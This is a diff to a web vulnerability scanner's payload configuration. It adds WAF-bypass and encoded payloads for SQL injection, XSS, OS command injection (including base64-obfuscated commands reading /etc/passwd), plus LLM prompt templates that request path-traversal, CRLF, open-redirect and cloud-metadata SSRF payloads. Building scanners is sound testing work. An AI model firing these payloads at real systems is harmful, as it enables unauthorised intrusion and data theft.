@@ -84,6 +84,20 @@ sqli:
   # ── WAF bypass — case variation ───────────────────────────────────
   - "' UniOn SeLeCt NULL--"
   - "' uNiOn aLl sElEcT NULL--"
+  # ── WAF bypass — double URL encoding ─────────────────────────────
+  - "%2527%20OR%25201%3D1--"
+  - "%27%20OR%20%271%27%3D%271"
+  # ── WAF bypass — hex-encoded strings (MySQL) ─────────────────────
+  - "' OR username=0x61646d696e--"
+  - "' UNION SELECT 0x61646d696e,0x70617373776f7264--"
+  # ── WAF bypass — space alternatives ─────────────────────────────
+  - "'%0aOR%0a'1'='1"
+  - "'%0bOR%0b1=1--"
+  - "'+OR+1=1--"
+  - "1'/**/AND/**/SLEEP(3)--"
+  # ── WAF bypass — scientific notation (MySQL) ─────────────────────
+  - "1e0 UNION SELECT NULL--"
+  - "1.0 UNION SELECT NULL--"
   # ── Second-order / out-of-band markers ───────────────────────────
   - "1' AND LOAD_FILE('/etc/passwd')--"
   - "' INTO OUTFILE '/tmp/wscan_test.txt'--"
@@ -149,6 +163,23 @@ xss:
   - "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;"
   - "&#60;script&#62;alert(1)&#60;/script&#62;"
   - "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
+  # ── Double URL encoded ────────────────────────────────────────────
+  - "%253Cscript%253Ealert(1)%253C/script%253E"
+  - "%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E"
+  # ── JS hex / unicode escape in event handler ─────────────────────
+  - "<img src=x onerror=\\x61lert(1)>"
+  - "<img src=x onerror=\\u0061lert(1)>"
+  - "<svg onload=\\x61lert(1)>"
+  # ── HTML entity in javascript: URI ───────────────────────────────
+  - "java&#x73;cript:alert(1)"
+  - "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"
+  # ── mXSS (mutation-based XSS) ────────────────────────────────────
+  - "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
+  - "<listing><img src=x onerror=alert(1)></listing>"
+  - "<xmp><img src=x onerror=alert(1)></xmp>"
+  # ── CSP bypass — nonce-less gadgets ──────────────────────────────
+  - "<link rel=preload as=script href=//x.com/x.js>"
+  - "<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">"
   # ── Filter bypass — null byte / slash variants ────────────────────
   - "<scr\0ipt>alert('XSS')</scr\0ipt>"
   - "<scr%00ipt>alert('XSS')</scr%00ipt>"
@@ -248,6 +279,25 @@ os:
   - "; echo $PATH"
   - "| echo $HOME"
   - "| echo $USER"
+  # ── URL-encoded separator WAF bypass ─────────────────────────────
+  - "%3bwhoami"
+  - "%7cwhoami"
+  - "%0awhoami"
+  - "%0d%0awhoami"
+  # ── IFS / brace expansion (space-free) ───────────────────────────
+  - ";{cat,/etc/passwd}"
+  - ";{id,}"
+  - ";$IFS$(id)"
+  - "|${IFS}cat${IFS}/etc/passwd"
+  # ── Base64-encoded commands ───────────────────────────────────────
+  - ";bash<<<$(echo d2hvYW1p|base64 -d)"
+  - ";echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|bash"
+  # ── Wildcard / glob trick ─────────────────────────────────────────
+  - ";/???/??t /???/p?sswd"
+  - ";/usr/bin/wh??ami"
+  # ── Python / Perl one-liner fallback ─────────────────────────────
+  - ";python3 -c 'import os;os.system(\"id\")'"
+  - ";perl -e 'system(\"id\")'"
 
 ssti:
   # ── Generic math probes (engine-agnostic) ────────────────────────
@@ -415,7 +465,7 @@ llm_prompts:
     - search/q/query → UNION-based, error-based
     - order/sort → ORDER BY injection
 
-    Generate exactly 10 diverse payloads covering ALL of these categories:
+    Generate exactly 12 diverse payloads covering ALL of these categories:
     1. Syntax error probe: single quote, double quote, backtick
     2. Auth bypass: OR '1'='1, admin'--
     3. UNION column count detection: UNION SELECT NULL,NULL--
@@ -423,12 +473,14 @@ llm_prompts:
     5. Time-based blind: SLEEP(3), WAITFOR DELAY '0:0:3', pg_sleep(3)
     6. Error-based MySQL: EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))
     7. Error-based MSSQL: CONVERT(int,@@version)
-    8. WAF bypass via comments: '/**/OR/**/1=1--, /*!UNION*//*!SELECT*/ NULL--
-    9. Stacked queries: '; SELECT 1--
-    10. OOB / second-order: ' INTO OUTFILE '/tmp/x'--
+    8. WAF bypass via inline comments: '/**/OR/**/1=1--
+    9. WAF bypass via URL encoding: %27%20OR%20%271%27%3D%271
+    10. WAF bypass via hex string: ' OR username=0x61646d696e--
+    11. WAF bypass via space alternative: '||'1'='1 (pipe concat, Oracle)
+    12. Stacked queries / OOB: '; SELECT 1--
 
     Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
-    Example: ["'", "' OR '1'='1'--", "1 UNION SELECT NULL--"]
+    Example: ["'", "' OR '1'='1'--", "1 UNION SELECT NULL--", "'/**/OR/**/1=1--"]
 
   xss: |
     You are an expert web application penetration tester specializing in XSS.
@@ -440,20 +492,22 @@ llm_prompts:
     - url/href/src → attribute context; use javascript: or data: URI
     - style/css → CSS injection: expression(), -moz-binding
 
-    Generate exactly 10 diverse payloads covering:
+    Generate exactly 12 diverse payloads covering:
     1. Basic script tag: <script>alert(1)</script>
     2. Event handler on img: <img src=x onerror=alert(1)>
     3. SVG with onload: <svg onload=alert(1)>
     4. Attribute injection: " onmouseover="alert(1)
     5. JavaScript URI: javascript:alert(document.cookie)
     6. HTML5 autofocus: <input autofocus onfocus=alert(1)>
-    7. Template literal / eval bypass: <script>eval(atob('YWxlcnQoMSk='))</script>
-    8. Filter bypass via encoding: <scr&#105;pt>alert(1)</scr&#105;pt>
-    9. Polyglot: "><svg/onload=alert(1)><!--
-    10. DOM sink via hash: #<img src=x onerror=alert(1)>
+    7. eval+atob bypass: <script>eval(atob('YWxlcnQoMSk='))</script>
+    8. HTML entity bypass: <scr&#105;pt>alert(1)</scr&#105;pt>
+    9. URL encoded: %3Cscript%3Ealert(1)%3C/script%3E
+    10. Double URL encoded: %253Cscript%253Ealert(1)%253C/script%253E
+    11. JS hex escape in handler: <img src=x onerror=\x61lert(1)>
+    12. Polyglot: "><svg/onload=alert(1)><!--
 
     Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
-    Example: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
+    Example: ["<script>alert(1)</script>", "%253Cscript%253Ealert(1)%253C%2Fscript%253E"]
 
   os: |
     You are an expert web application penetration tester specializing in OS command injection.
@@ -464,23 +518,23 @@ llm_prompts:
     - host/ip/server/ping → network command injection
     - cmd/exec/command → direct command injection
 
-    Generate exactly 10 diverse payloads for BOTH Unix and Windows:
+    Generate exactly 12 diverse payloads for BOTH Unix and Windows:
     1. Unix chained: ; id
     2. Unix pipe: | id
-    3. Unix background: & id
-    4. Unix AND: && id
-    5. Unix subshell: $(id)
-    6. Unix backtick: `id`
-    7. Windows chained: & whoami
-    8. Windows AND: && whoami
-    9. Blind time-based Unix: ; sleep 3
-    10. Blind time-based Windows: & ping -n 3 127.0.0.1
+    3. Unix AND: && id
+    4. Unix subshell: $(id)
+    5. Unix backtick: `id`
+    6. Windows chained: & whoami
+    7. Blind Unix time-based: ; sleep 3
+    8. Blind Windows time-based: & ping -n 3 127.0.0.1
+    9. URL-encoded separator: %3bid  (semicolon URL encoded)
+    10. IFS bypass (no space): ;${IFS}id
+    11. Brace expansion (no space): ;{id,}
+    12. Base64 encoded command: ;bash<<<$(echo d2hvYW1p|base64 -d)
 
-    For each, also include a URL-encoded variant where the separator is encoded (%3B, %7C, %26).
     Prioritize Unix payloads if the URL path looks like a Linux app.
-
     Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
-    Example: ["; id", "| id", "& whoami"]
+    Example: ["; id", "%3bid", ";${IFS}id", ";{cat,/etc/passwd}"]
 
   ssti: |
     You are an expert penetration tester specializing in Server-Side Template Injection (SSTI).
@@ -505,17 +559,19 @@ llm_prompts:
     You are an expert penetration tester specializing in path traversal / LFI.
     Generate path traversal payloads for a field named "{field_name}" at "{url}".
 
-    Generate exactly 10 diverse payloads:
+    Generate exactly 12 diverse payloads using MULTIPLE encoding techniques:
     1. Basic Unix: ../../../etc/passwd
     2. Basic Windows: ..\..\..\windows\win.ini
-    3. URL encoded: ..%2F..%2F..%2Fetc%2Fpasswd
-    4. Double encoded: ..%252F..%252Fetc%252Fpasswd
-    5. Null byte: ../../../etc/passwd%00
-    6. Absolute Unix: /etc/passwd
-    7. Absolute Windows: C:\windows\win.ini
-    8. Proc self: /proc/self/environ
-    9. Log poisoning target: /var/log/apache2/access.log
-    10. Deep traversal: ../../../../../../../../etc/passwd
+    3. Single URL encoded: ..%2F..%2F..%2Fetc%2Fpasswd
+    4. Double URL encoded: ..%252F..%252F..%252Fetc%252Fpasswd
+    5. Triple URL encoded: ..%25252F..%25252Fetc%25252Fpasswd
+    6. UTF-8 overlong slash: ..%c0%af..%c0%afetc%c0%afpasswd
+    7. Strip bypass (../  removed once): ....//....//....//etc//passwd
+    8. Null byte: ../../../etc/passwd%00
+    9. Absolute Unix: /etc/passwd
+    10. Proc self environ: /proc/self/environ
+    11. Windows double encoded: ..%255c..%255c..%255cwindows%255cwin.ini
+    12. Deep traversal: ../../../../../../../../etc/passwd
 
     Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
 
@@ -523,15 +579,17 @@ llm_prompts:
     You are an expert penetration tester specializing in HTTP header injection.
     Generate header injection payloads for a field named "{field_name}" at "{url}".
 
-    Generate exactly 8 payloads using CRLF (\r\n) sequences:
+    Generate exactly 10 payloads using CRLF (\r\n) and encoding variants:
     1. Basic CRLF: value%0d%0aSet-Cookie:injected=1
-    2. Header split: value%0aX-Injected:true
+    2. LF only: value%0aX-Injected:true
     3. Double CRLF (response split): value%0d%0a%0d%0a<html>injected</html>
     4. URL encoded CR+LF: value%0D%0ALocation:http://evil.com
-    5. Unicode CR: value\u000dSet-Cookie:x=1
-    6. Location redirect: value%0d%0aLocation:http://example.com
-    7. XSS via header: value%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
-    8. Cache poisoning: value%0d%0aX-Forwarded-Host:evil.com
+    5. Double URL encoded: value%250d%250aSet-Cookie:x=1
+    6. Unicode LF: value\u000aSet-Cookie:x=1
+    7. Location redirect: value%0d%0aLocation:http://example.com
+    8. XSS via header split: value%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
+    9. Cache poisoning: value%0d%0aX-Forwarded-Host:evil.com
+    10. Cookie injection: value%0d%0aSet-Cookie:admin=1;Path=/
 
     Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
 
@@ -539,17 +597,19 @@ llm_prompts:
     You are an expert penetration tester specializing in open redirect vulnerabilities.
     Generate open redirect payloads for a field named "{field_name}" at "{url}".
 
-    Generate exactly 10 diverse payloads:
-    1. Basic absolute URL: https://evil.com
+    Generate exactly 12 diverse payloads using URL tricks and encoding:
+    1. Basic HTTPS: https://evil.com
     2. Protocol-relative: //evil.com
-    3. URL with path: https://evil.com/phishing
-    4. Encoded slash: https:/%2Fevil.com
-    5. Double encoded: https:%2F%2Fevil.com
-    6. Unicode slash: https://evil.com\@trusted.com
-    7. Backslash bypass: https:\\evil.com
-    8. Data URI: data:text/html,<script>alert(1)</script>
-    9. JavaScript URI: javascript:alert(document.cookie)
-    10. Newline bypass: %0ahttps://evil.com
+    3. Triple slash: ///evil.com
+    4. Backslash: /\evil.com
+    5. URL encoded slash: %2F%2Fevil.com
+    6. Double URL encoded: %252F%252Fevil.com
+    7. @-sign bypass: https://trusted.com@evil.com
+    8. Newline bypass: %0ahttps://evil.com
+    9. Tab bypass: %09https://evil.com
+    10. Decimal IP of evil (for demonstration): http://2130706433/evil
+    11. Data URI XSS: data:text/html,<script>alert(1)</script>
+    12. javascript: URI: javascript:alert(document.cookie)
 
     Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
 
@@ -557,16 +617,18 @@ llm_prompts:
     You are an expert penetration tester specializing in SSRF.
     Generate SSRF payloads for a field named "{field_name}" at "{url}".
 
-    Generate exactly 10 diverse payloads targeting internal services:
+    Generate exactly 12 diverse payloads targeting internal services and using bypass techniques:
     1. AWS metadata: http://169.254.169.254/latest/meta-data/
     2. GCP metadata: http://metadata.google.internal/computeMetadata/v1/
     3. Azure IMDS: http://169.254.169.254/metadata/instance
     4. Localhost HTTP: http://127.0.0.1/
-    5. Localhost alias: http://localhost/
+    5. IPv6 loopback: http://[::1]/
     6. File read: file:///etc/passwd
-    7. Internal port scan: http://127.0.0.1:8080/
-    8. IPv6 loopback: http://[::1]/
-    9. DNS rebinding bypass: http://localtest.me/
-    10. Decimal IP: http://2130706433/ (127.0.0.1 in decimal)
+    7. Internal DB port: http://127.0.0.1:6379/  (Redis)
+    8. Decimal IP bypass: http://2130706433/  (127.0.0.1)
+    9. Octal IP bypass: http://0177.0.0.1/  (127.0.0.1)
+    10. DNS rebinding: http://localtest.me/
+    11. URL encoded: http://%31%32%37%2e%30%2e%30%2e%31/
+    12. HTTPS variant: https://169.254.169.254/latest/meta-data/
 
     Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
